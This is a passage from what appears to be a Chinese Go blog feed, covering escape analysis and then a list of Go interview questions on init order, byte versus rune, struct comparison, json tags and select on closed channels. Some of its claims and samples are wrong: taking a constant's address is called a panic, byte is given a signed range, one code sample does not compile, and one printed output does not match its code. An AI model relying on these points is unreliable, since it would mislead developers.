class="number">6</span>: can inline Foo</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">7</span>:<span class="number">9</span>: can inline Foo.func1</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">18</span>:<span class="number">14</span>: inlining call to Foo</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">7</span>:<span class="number">9</span>: can inline main.Foo.func1</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">19</span>:<span class="number">7</span>: inlining call to main.Foo.func1</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">6</span>:<span class="number">2</span>: moved to heap: x</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">7</span>:<span class="number">9</span>: <span class="function"><span class="keyword">func</span> <span class="title">literal</span> <span class="title">escapes</span> <span class="title">to</span> <span class="title">heap</span></span></span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">18</span>:<span class="number">14</span>: <span class="function"><span class="keyword">func</span> <span class="title">literal</span> <span class="title">does</span> <span class="title">not</span> <span class="title">escape</span></span></span><br></pre></td></tr></table></figure><h3 id="在slice或map中存储指针"><a href="#在slice或map中存储指针" class="headerlink" title="在slice或map中存储指针"></a>在slice或map中存储指针</h3><blockquote><p>比如[]*string, 其后面的数组可能是在栈上分配的, 但其引用的值还是堆上;</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> x <span class="type">int</span></span><br><span class="line">    x = <span class="number">10</span></span><br><span class="line">    <span class="keyword">var</span> ls []*<span class="type">int</span></span><br><span class="line">    ls = <span class="built_in">append</span>(ls, &amp;x)         <span class="comment">// x发生逃逸, ls存储的是指针, 所以ls底层的数组虽然在栈上存储, 但本身却逃逸到堆上</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"># command-line-arguments</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">5</span>:<span class="number">6</span>: can inline main</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">11</span>:<span class="number">6</span>: moved to heap: x</span><br></pre></td></tr></table></figure><h3 id="4-切片扩容"><a href="#4-切片扩容" class="headerlink" title="4. 切片扩容"></a>4. 切片扩容</h3><blockquote><p>切片扩容后长度太长, 导致栈空间不足, 逃逸到堆上;</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    s := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">10000</span>, <span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">for</span> index, _ := <span class="keyword">range</span> s &#123;</span><br><span class="line">        s[index] = index</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"># command-line-arguments</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">5</span>:<span class="number">6</span>: can inline main</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">11</span>:<span class="number">11</span>: <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">10000</span>) escapes to heap</span><br></pre></td></tr></table></figure><h3 id="5-在interface类型上调用方法"><a href="#5-在interface类型上调用方法" class="headerlink" title="5. 在interface类型上调用方法"></a>5. 在interface类型上调用方法</h3><blockquote><p>在interface类型上调用方法时会把interface变量使用堆分配, 因为方法的真正实现只能在运行时知道;</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> foo <span class="keyword">interface</span> &#123;</span><br><span class="line">    fooFunc()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> foo1 <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f1 foo1)</span></span> fooFunc() &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> f foo1</span><br><span class="line">    f = foo1&#123;&#125;</span><br><span class="line">    f.fooFunc()             <span class="comment">// 调用方法时, f发生逃逸, 因为方法是动态分配的</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"># command-line-arguments</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">12</span>:<span class="number">6</span>: can inline foo1.fooFunc</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">16</span>:<span class="number">6</span>: can inline main</span><br><span class="line">&lt;autogenerated&gt;:<span class="number">1</span>: inlining call to foo1.fooFunc</span><br><span class="line">./test_Demo_04.<span class="keyword">go</span>:<span class="number">18</span>:<span class="number">10</span>: foo1&#123;&#125; escapes to heap</span><br></pre></td></tr></table></figure><h2 id="避免内存逃逸的方法"><a href="#避免内存逃逸的方法" class="headerlink" title="避免内存逃逸的方法"></a>避免内存逃逸的方法</h2><ul><li>对于小型数据, 使用传值而不是传指针, 避免内存逃逸;</li><li>避免使用长度不固定的slice切片, 在编译期无法确定切片长度, 只能将切片使用堆分配;</li><li>interface调用方法会发生内存逃逸;</li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang八股文汇总</title>
      <link href="/f25d7e27.html"/>
      <url>/f25d7e27.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong></strong></p><p>记录Golang面试八股文</p></div><span id="more"></span><h2 id="Go基础"><a href="#Go基础" class="headerlink" title="Go基础"></a>Go基础</h2><h3 id="init和main函数的相关特点"><a href="#init和main函数的相关特点" class="headerlink" title="init和main函数的相关特点"></a>init和main函数的相关特点</h3><h4 id="init函数（没有输入参数、返回值）的主要作用"><a href="#init函数（没有输入参数、返回值）的主要作用" class="headerlink" title="init函数（没有输入参数、返回值）的主要作用:"></a>init函数（没有输入参数、返回值）的主要作用:</h4><ul><li>初始化不能采用初始化表达式初始化的变量;</li><li>在程序运行前注册;</li><li>实现<code>sync.Once</code>功能;</li><li>其他</li></ul><h4 id="init顺序"><a href="#init顺序" class="headerlink" title="init顺序"></a>init顺序</h4><ol><li>在同一个<code>package</code>中, 可以多个文件中定义<code>init</code>方法;</li><li>在同一个<code>go</code>文件中, 可以重复定义<code>init</code>方法;</li><li>在同一个<code>package</code>中, 不同文件中的<code>init</code>方法执行按照文件名先后执行各个文件中的<code>init</code>方法;</li><li>在同一个文件中的多个<code>init</code>方法, 按照在代码中编写的顺序依次执行不同的<code>init</code>方法;</li><li>对于不同的<code>package</code>, 如果不相互依赖的话, 按照<code>main</code>包中<code>import</code>的顺序调用其包中的<code>init()</code>函数;</li><li>如果<code>package</code>存在依赖, 调用顺序为最后被依赖的最先被初始化, 例如: 导入顺序main -&gt; A -&gt; B -&gt; C, 则初始化顺序为C -&gt; B -&gt; A -&gt; main, 一次执行对应的<code>init</code>方法;</li></ol><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='https://raw.githubusercontent.com/Dooookey/Photos/main/golang-init%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F.png' data-fancybox='default' data-caption='Golang-init函数执行顺序'><img fancybox itemprop="contentUrl" src="https://raw.githubusercontent.com/Dooookey/Photos/main/golang-init%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/golang-init%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Golang-init函数执行顺序"></a><span class='image-caption'>Golang-init函数执行顺序</span></div></div><h3 id="Golang的数据结构的零值是什么"><a href="#Golang的数据结构的零值是什么" class="headerlink" title="Golang的数据结构的零值是什么?"></a>Golang的数据结构的零值是什么?</h3><div class="note info"><p><strong></strong></p><p>所有整型类型: 0<br>浮点类型: 0.0<br>布尔类型: false<br>字符串类型: “”<br>指针、interface、切片(slice)、channel、map、function: nil</p><p>Go的零值初始是递归的, 即数组、结构体等类型的零值初始化就是对其组成元素逐一进行零值初始化</p></div><h3 id="byte和rune有什么区别"><a href="#byte和rune有什么区别" class="headerlink" title="byte和rune有什么区别"></a>byte和rune有什么区别</h3><div class="note info"><p><strong></strong></p><ul><li><code>rune</code>和<code>byte</code>在Go语言中都是字符类型, 且都是别名类型;</li><li><code>byte</code>型本质上是<code>uint8</code>类型的别名, 代表了ASCII码的一个字符;</li><li><code>rune</code>型本质上是<code>int32</code>型的别名, 代表一个UTF-8字符;</li></ul></div><h3 id="Go-struct-能不能比较"><a href="#Go-struct-能不能比较" class="headerlink" title="Go struct 能不能比较"></a>Go struct 能不能比较</h3><p>需要根据具体情况分析, 如果struct中含有不能被比较的字段类型, 就不能被比较;<br>如果struct中所有的字段类型都支持比较, 那么就支持比较;</p><div class="note inof"><p><strong>不能被比较的类型</strong></p><ul><li>slice, 因为slice是引用类型, 除非是和nil比较;</li><li>map, 和slice同理, 如果要比较两个map只能通过循环遍历实现;</li><li>函数类型;</li></ul></div><div class="note info"><p><strong>注意</strong></p><ul><li>结构体之间只能比较它们是否相等, 而不能比较它们的大小;</li><li>只能所有属性相等而且属性顺序一致的结构体才能进行比较;</li></ul></div><h3 id="Go-import的三种方式"><a href="#Go-import的三种方式" class="headerlink" title="Go import的三种方式"></a>Go import的三种方式</h3><h4 id="加下划线"><a href="#加下划线" class="headerlink" title="加下划线"></a>加下划线</h4><div class="note info"><p><strong></strong></p><p>import下划线（如：_ “github.com&#x2F;xxx&#x2F;xxx”）的作用: 当导入一个包时, 该包下的文件里所有的<code>init()</code>函数都会被执行。然而有些时候我们并不需要把整个包都导入进来, 仅仅是希望它执行<code>init()</code>函数而已。这个时候就可以使用<code>import _</code>引用该包。<br>即: 使用[import _ 包路径]只是引用该包, 仅仅是为了调用<code>init函数</code>, 所以无法通过包名来调用包中的其他函数;</p></div><h4 id="加点"><a href="#加点" class="headerlink" title="加点(.)"></a>加点(.)</h4><div class="note info"><p><strong></strong></p><p>import和引用的包名之间加点（.）操作的含义就是这个包导入之后在调用这个包的函数时, 可以省略前戳的包名;</p></div><h4 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h4><div class="note info"><p><strong></strong></p><p>别名操作可以把包命名成另一个用起来容易记忆的名字;</p></div><h3 id="Golang的常量地址"><a href="#Golang的常量地址" class="headerlink" title="Golang的常量地址"></a>Golang的常量地址</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> i = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> j = <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(&amp;j, j)</span><br><span class="line">    fmt.Println(&amp;i, i) <span class="comment">// panic</span></span><br><span class="line">    <span class="comment">// Go语言中, 常量无法寻址, 是不能进行取指针操作的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="string和-byte如何取舍"><a href="#string和-byte如何取舍" class="headerlink" title="string和[]byte如何取舍"></a>string和[]byte如何取舍</h3><h4 id="string擅长的场景"><a href="#string擅长的场景" class="headerlink" title="string擅长的场景:"></a>string擅长的场景:</h4><div class="note info"><p><strong></strong></p><ul><li>需要字符串比较的场景;</li><li>不需要nil字符串的场景;</li></ul></div><h4 id="byte擅长的场景"><a href="#byte擅长的场景" class="headerlink" title="[]byte擅长的场景"></a>[]byte擅长的场景</h4><div class="note info"><p><strong></strong></p><ul><li>修改字符串的场景, 尤其是修改粒度为1个字节;</li><li>函数返回值, 需要用nil表示含义的场景;</li><li>需要切片操作的场景;</li></ul></div><h3 id="字符串转成byte数组-会发生内存拷贝吗"><a href="#字符串转成byte数组-会发生内存拷贝吗" class="headerlink" title="字符串转成byte数组, 会发生内存拷贝吗"></a>字符串转成byte数组, 会发生内存拷贝吗</h3><blockquote><p>字符串转成切片, 会产生拷贝。严格来说, 只要是发生类型强化转都会发生内存拷贝。频繁的内存拷贝操作听起来对性能不太友好。有没有什么办法可以在字符串转成切片的时候不用发生拷贝呢?</p></blockquote><figure class="highlight go"><figcaption><span>代码实现</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;reflect&quot;</span></span><br><span class="line">    <span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    a := <span class="string">&quot;aaa&quot;</span></span><br><span class="line">    ssh := *(*reflect.StringHeader)(unsafe.Pointer(&amp;a))</span><br><span class="line">    b := *(*[]<span class="type">byte</span>)(unsafe.Pointer(&amp;ssh))</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%v&quot;</span>, b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h4><ul><li><p><code>StringHeader</code>是<code>字符串</code>在go的底层结构</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> StringHeader <span class="keyword">struct</span> &#123;</span><br><span class="line">    Data <span class="type">uintptr</span></span><br><span class="line">    Len <span class="type">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>SliceHeader</code>是<code>切片</code>在go的底层结构</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> SliceHeader <span class="keyword">struct</span> &#123;</span><br><span class="line">    Data <span class="type">uintptr</span></span><br><span class="line">    Len <span class="type">int</span></span><br><span class="line">    Cap <span class="type">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>那么如果想要在底层转换二者, 只需要把<code>StringHeader</code>的地址强转成<code>SliceHeader</code>就行。那么go有个包很强的包叫<code>unsafe</code>。</p><ol><li>unsafe.Pointer(&amp;a)方法可以得到变量<code>a</code>的地址;</li><li>(*reflect.StringHeader)(unsafe.Pointer(&amp;a))可以把字符串a转成底层结构的形式;</li><li>(*[]byte)(unsafe.Pointer(&amp;ssh))可以把ssh底层结构转成byte的切片的指针;</li><li>再通过<code>*</code>转成指针指向的实际内容;</li></ol></li></ul><h3 id="翻转含有中文、数字、英文字符的字符串"><a href="#翻转含有中文、数字、英文字符的字符串" class="headerlink" title="翻转含有中文、数字、英文字符的字符串"></a>翻转含有中文、数字、英文字符的字符串</h3><blockquote><p>翻转含有<code>中文、数字、英文字母</code>的字符串</p></blockquote><figure class="highlight go"><figcaption><span>代码实现</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    src := <span class="string">&quot;你好abc啊哈哈&quot;</span></span><br><span class="line">    dst := reverse([]<span class="type">rune</span>(src))</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%v\n&quot;</span>, <span class="type">string</span>(dst))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reverse</span><span class="params">(s []<span class="type">rune</span>)</span></span> []<span class="type">rune</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i, j := <span class="number">0</span>, <span class="built_in">len</span>(s)<span class="number">-1</span>;i&lt;j; i,j = i+<span class="number">1</span>, j<span class="number">-1</span> &#123;</span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="解释-1"><a href="#解释-1" class="headerlink" title="解释"></a>解释</h4><ul><li><code>rune</code>关键字, 从golang源码中看出, 它是int32的别名(-2^31 ~ 2^31-1), 比如byte(-128 ~ 127), 可表示更多的字符。</li><li>由于rune可表示的范围更大, 所以能处理一切字符, 当然也包括中文字符。在平时计算中文字符, 可用rune。</li><li>因此将<code>字符串</code>转成<code>rune的切片</code>, 再进行翻转;</li></ul><h3 id="json包变量不加tag会怎么样"><a href="#json包变量不加tag会怎么样" class="headerlink" title="json包变量不加tag会怎么样?"></a>json包变量不加tag会怎么样?</h3><blockquote><p><code>json</code>包里使用的时候, 结构体里的变量不加<code>tag</code>能不能正常转成<code>json</code>里的字段?</p></blockquote><h4 id="回答"><a href="#回答" class="headerlink" title="回答"></a>回答</h4><ul><li>如果变量<code>首字母小写</code>, 则为<code>private</code>。无论如何<code>不能转</code>, 因为取不到<code>反射信息</code>。</li><li>如果变量<code>首字母大写</code>, 则为<code>public</code>:<ol><li><code>不加tag</code>, 可以正常转为<code>json</code>里的字段, <code>json</code>内字段名跟结构体内字段<code>原名一致</code>;</li><li><code>加了tag</code>, 从<code>struct</code>转<code>json</code>的时候, <code>json</code>的字段名就是<code>tag</code>里的字段名, 原字段名已经没用;</li></ol></li></ul><h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> J <span class="keyword">struct</span> &#123;</span><br><span class="line">    a <span class="type">string</span>                <span class="comment">// 小写无tag</span></span><br><span class="line">    b <span class="type">string</span> <span class="string">`json:&quot;B&quot;`</span>     <span class="comment">// 小写加tag</span></span><br><span class="line">    C <span class="type">string</span>                <span class="comment">// 大写无tag</span></span><br><span class="line">    D <span class="type">string</span> <span class="string">`json:&quot;DD&quot;`</span>    <span class="comment">// 大写加tag</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    j := J &#123;</span><br><span class="line">        a: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        b: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">        C: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">        D: <span class="string">&quot;4&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;转为json前j结构体的内容 = %+v\n&quot;</span>, j)             <span class="comment">// 转为json前j结构体的内容 = &#123; a:1 b:2 C:3 D:4 &#125;</span></span><br><span class="line">    jsonInfo, _ := json.Marshal(j)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;转为json后的内容 = %+v\n&quot;</span>, <span class="type">string</span>(jsonInfo))    <span class="comment">// 转为json后的内容 = &#123; &quot;C&quot;: &quot;3&quot;, &quot;DD&quot;: &quot;4&quot; &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="解释-2"><a href="#解释-2" class="headerlink" title="解释"></a>解释</h4><ul><li>结构体里定义了四个字段, 分别对应<code>小写无tag</code>, <code>小写加tag</code>、<code>大写无tag</code>、<code>大写加tag</code>;</li><li>转为<code>json</code>后首字母<code>小写的</code>不管加不加tag<code>都不能</code>转为<code>json</code>里的内容, 而<code>大写的</code>加了tag可以<code>取别名</code>, 不加<code>tag</code>则<code>json</code>内的字段跟结构体字段<code>原名一致</code>;</li></ul><h3 id="Go语言中cap函数可以作用于哪些内容"><a href="#Go语言中cap函数可以作用于哪些内容" class="headerlink" title="Go语言中cap函数可以作用于哪些内容?"></a>Go语言中cap函数可以作用于哪些内容?</h3><ul><li>array返回数组的元素个数</li><li>slice返回slice的最大容量</li><li>channel返回chennel的容量</li></ul><h3 id="Go语言的引用类型有什么"><a href="#Go语言的引用类型有什么" class="headerlink" title="Go语言的引用类型有什么?"></a>Go语言的引用类型有什么?</h3><blockquote><p>Go语言中的引用类型有func(函数类型)、interface(接口类型)、slice(切片类型)、map(字典类型)、channel(管道类型)、*(指针类型)</p></blockquote><h3 id="for-select-如果通道已经关闭会怎么样-如果select中只有一个case呢"><a href="#for-select-如果通道已经关闭会怎么样-如果select中只有一个case呢" class="headerlink" title="for-select, 如果通道已经关闭会怎么样?如果select中只有一个case呢?"></a>for-select, 如果通道已经关闭会怎么样?如果select中只有一个case呢?</h3><blockquote><p>for循环select时, 如果通道已经关闭会怎么样?如果select中的case只有一个, 又会怎么样?</p></blockquote><h4 id="回答-1"><a href="#回答-1" class="headerlink" title="回答"></a>回答</h4><ul><li>for循环select时, 如果其中一个case通道已经关闭, 则每次都会执行到这个case;</li><li>如果select里边只有一个case, 而这个case被关闭了, 则会出现死循环;</li></ul><h4 id="解释-3"><a href="#解释-3" class="headerlink" title="解释"></a>解释</h4><ol><li>for循环里被关闭的通道<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    fmat = <span class="string">&quot;2006-01-02 15:04:05&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">        c &lt;- <span class="number">10</span></span><br><span class="line">        <span class="built_in">close</span>(c)</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> x, ok := &lt;-c:</span><br><span class="line">                fmt.Printf(<span class="string">&quot;%v, 通道读取到: x=%v, ok=%v\n&quot;</span>,time.Now().Format(fmat) x, ok)</span><br><span class="line">                time.Sleep(<span class="number">500</span> * time.Millisecond)</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>输出结果<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">44</span>, 没读到信息进入<span class="keyword">default</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">44</span>, 没读到信息进入<span class="keyword">default</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">45</span>, 通道读取到: x=<span class="number">10</span>, ok=<span class="literal">true</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">45</span>, 通道读取到: x=<span class="number">0</span>, ok=<span class="literal">false</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">46</span>, 通道读取到: x=<span class="number">0</span>, ok=<span class="literal">false</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">46</span>, 通道读取到: x=<span class="number">0</span>, ok=<span class="literal">false</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">47</span>, 通道读取到: x=<span class="number">0</span>, ok=<span class="literal">false</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">47</span>, 通道读取到: x=<span class="number">0</span>, ok=<span class="literal">false</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">48</span>, 通道读取到: x=<span class="number">0</span>, ok=<span class="literal">false</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">48</span>, 通道读取到: x=<span class="number">0</span>, ok=<span class="literal">false</span></span><br><span class="line"><span class="number">2024</span><span class="number">-02</span><span class="number">-27</span> <span class="number">22</span>:<span class="number">29</span>:<span class="number">49</span>, 通道读取到: x=<span class="number">0</span>, ok=<span 